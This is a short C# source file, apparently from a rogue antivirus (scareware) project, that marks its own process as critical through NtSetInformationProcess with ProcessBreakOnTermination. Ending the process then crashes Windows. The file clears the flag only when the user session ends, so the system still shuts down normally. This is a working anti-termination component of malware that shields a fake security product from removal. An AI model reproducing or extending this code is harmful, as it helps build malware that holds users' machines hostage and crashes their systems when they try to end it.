using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using static Ntdll.ntdllMain;

namespace RogueAntivirusPatched.Classes
{
    internal class SystemShutdown
    {
        public void SetShutdownEvent()
        {
            SystemEvents.SessionEnding += SystemEvents_SessionEnding;
        }

        private void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            SetAppAsCritical(0);
        }

        public void SetAppAsCritical(int isCritical = 1)
        {
            var process = Process.GetCurrentProcess();
            NtSetInformationProcess(process.Handle, ProcClassInfo.ProcessBreakOnTermination, ref isCritical, sizeof(int));
        }
    }
}
